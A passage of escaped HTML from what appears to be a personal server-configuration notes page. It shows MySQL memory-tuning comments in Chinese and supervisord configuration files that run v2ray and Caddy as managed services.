style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定原則\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# tmp_table_size \u0026amp; max_heap_table_size：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 這兩個參數必須相同\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 建議設定為記憶體的 2-4%\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 64GB 機器建議 1-2GB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# sort_buffer_size：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 每個連線都會分配，不要設太大\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 建議 2-8MB，你的 2MB 其實已經合適\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# innodb_buffer_pool_size：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 最重要的參數\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 建議設定為記憶體的 60-70%\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 64GB 機器建議 38-42GB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# TempTable Storage Engine 參數（MySQL 8.0 關鍵）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003etemptable_max_ram\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e4294967296      # 4GB（記憶體中臨時表）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003etemptable_max_mmap\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e42949672960    # 40GB（記憶體映射檔案）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003etemptable_use_mmap\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e1              # 啟用記憶體映射\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ev2ray\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"supervisordconf\"\u003esupervisord.conf\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; supervisor config file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[unix_http_server]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003efile\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/var/run/supervisor.sock   ; (the path to the socket file)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003echmod\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e0700                       ; sockef file mode (default 0700)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[supervisord]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elogfile\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/var/log/supervisor/supervisord.log ; (main log file;default $CWD/supervisord.log)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003epidfile\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/var/run/supervisord.pid ; (supervisord pidfile;default supervisord.pid)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003echildlogdir\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/var/log/supervisor            ; (\u0026#39;AUTO\u0026#39; child log dir, default $TEMP)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elogfileMaxbytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e100MB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elogfileBackups\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e50\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eloglevel\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003edebug\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; the below section must remain in the config file for RPC\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; (supervisorctl/web interface) to work, additional interfaces may be\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; added by defining them in separate rpcinterface: sections\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[rpcinterface:supervisor]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003esupervisor.rpcinterface_factory\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003esupervisor.rpcinterface:make_main_rpcinterface\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[supervisorctl]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eserverurl\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eunix:///var/run/supervisor.sock ; use a unix:// URL  for a unix socket\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; The [include] section can just contain the \u0026#34;files\u0026#34; setting.  This\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; setting can list multiple files (separated by whitespace or\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; newlines).  It can also contain wildcards.  The filenames are\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; interpreted as relative to this file.  Included files *cannot*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; include files themselves.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[include]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003efiles\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/supervisor/conf.d/*.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"confdv2rayconf\"\u003econf.d/v2ray.conf\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[program:v2ray]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ecommand\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/v2ray/bin/v2ray run -config /etc/v2ray/config.json -confdir /etc/v2ray/conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eprocess_name\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ev2ray\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estdout_logfile\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/log/supervisor/v2ray.log\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estderr_logfile\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/log/supervisor/v2ray.log\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eautostart\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estartsecs\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estartretries\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eautorestart\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eexitcodes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estopsignal\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eTERM\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estopwaitsecs\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estopasgroup\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ekillasgroup\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[program:caddy]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ecommand\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/usr/local/bin/caddy run --environ --config /etc/caddy/Caddyfile --adapter caddyfile\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eprocess_name\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ecaddy\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estdout_logfile\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/log/supervisor/caddy.log\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estderr_logfile\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/log/supervisor/caddy.log\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eautostart\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estartsecs\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estartretries\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eautorestart\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eexitcodes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estopsignal\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eTERM\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estopwaitsecs\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estopasgroup\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ekillasgroup\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Server-Configs Notes"}]